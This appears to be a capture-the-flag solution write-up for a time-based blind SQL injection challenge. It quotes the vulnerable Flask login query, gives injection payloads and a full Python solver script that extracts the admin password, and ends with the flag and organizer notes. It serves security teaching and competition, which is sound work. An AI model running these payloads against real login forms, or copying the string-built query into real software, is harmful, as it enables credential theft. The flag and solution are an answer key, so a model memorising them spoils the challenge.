# Solution: The Impatient Database

This challenge involves a time-based Blind SQL Injection vulnerability. The application does not return any useful output from the database, but its response time can be manipulated to leak information.

## Understanding the Vulnerability

The vulnerability is in the `app.py` file's `/login` route. The user input is unsafely included in the query.

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    db = get_db()
    # Vulnerable query
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor = db.execute(query)
    # ...
```

Because there is no useful output, we must use a side-channel to exfiltrate data. The hint about response times points to a time-based attack. We can inject a `sleep()` command that is conditionally executed based on the result of a subquery.

For SQLite, there is no `sleep()` function, but we can use `LIKE` with a large string and `zeroblob` to simulate a delay. A common technique is `AND [condition] AND (SELECT 1 FROM (SELECT 2) WHERE 1=zeroblob(10000000)))`. A simpler way for this CTF is to use a custom function. `app.py` will define a `sleep()` function for SQLite.

## Steps to Solve

The goal is to find the password for the `admin` user. We will do this by asking a series of true/false questions to the database and observing the response time.

1.  **Confirm the Vulnerability:**
    Inject a `sleep()` command to see if the response is delayed.
    Payload for username: `admin' AND 1=1 AND sleep(3) --`
    If the server takes about 3 seconds longer to respond, the vulnerability is confirmed.

2.  **Find the Password Length:**
    We can ask "Is the password length 1?", "Is it 2?", and so on.
    Payload: `admin' AND (SELECT length(password) FROM users WHERE username = 'admin') = 1 AND sleep(3) --`
    We can script this to iterate through lengths until we find the correct one.

3.  **Exfiltrate the Password Character by Character:**
    Once we have the length, we can extract each character.
    Payload to check the first character: `admin' AND (SELECT substr(password, 1, 1) FROM users WHERE username = 'admin') = 'a' AND sleep(3) --`
    We can script this to iterate through all possible characters (a-z, A-Z, 0-9, _, etc.) for each position in the password.

## Example Solver Script

This requires automation. Here is a sample Python script to solve the challenge:

```python
import requests
import time

URL = "http://127.0.0.1:5005/login"
DELAY = 2  # seconds

def check_condition(payload):
    data = {'username': payload, 'password': 'fakepassword'}
    start_time = time.time()
    try:
        requests.post(URL, data=data, timeout=DELAY + 1)
    except requests.exceptions.Timeout:
        # If the request times out, the condition was true
        return True
    end_time = time.time()

    # If the request took longer than DELAY, the condition was true
    return (end_time - start_time) >= DELAY

def get_password():
    password = ""
    # First, find the length of the password
    length = 0
    for i in range(1, 30):
        payload = f"admin' AND (SELECT length(password) FROM users WHERE username = 'admin') = {i} AND sleep({DELAY}) -- "
        if check_condition(payload):
            length = i
            print(f"Password length is: {length}")
            break

    if length == 0:
        print("Could not determine password length.")
        return

    # Now, find each character of the password
    # Printable ASCII characters range from 32 to 126
    for i in range(1, length + 1):
        for char_code in range(32, 127):
            char_to_test = chr(char_code)
            # Use hex encoding for the character to avoid issues with quotes
            hex_char = hex(char_code)[2:]
            payload = f"admin' AND (SELECT substr(password, {i}, 1) FROM users WHERE username = 'admin') = '{char_to_test}' AND sleep({DELAY}) -- "
            if check_condition(payload):
                password += char_to_test
                print(f"Found character: {char_to_test}. Password so far: {password}")
                break

    return password

if __name__ == "__main__":
    found_password = get_password()
    print(f"The final password is: {found_password}")
```

Running this script will eventually reveal the password: `T1M3_B453D_BL1ND`. The flag is `ICIMS{T1M3_B453D_BL1ND}`.

## Organizer Notes

*   **Hosting:** Run the `app.py` script from the `files` directory. It requires Python and Flask.
*   **Flag:** `ICIMS{T1M3_B453D_BL1ND}`
*   **Vulnerability:** Time-based Blind SQL Injection. The `app.py` has a custom `sleep` function registered with SQLite to make the vulnerability work consistently.
*   **Note:** This is a difficult challenge that requires scripting. Participants will need to understand the principles of Blind SQLi and be able to automate their attacks. The provided solver script is one way to do it.
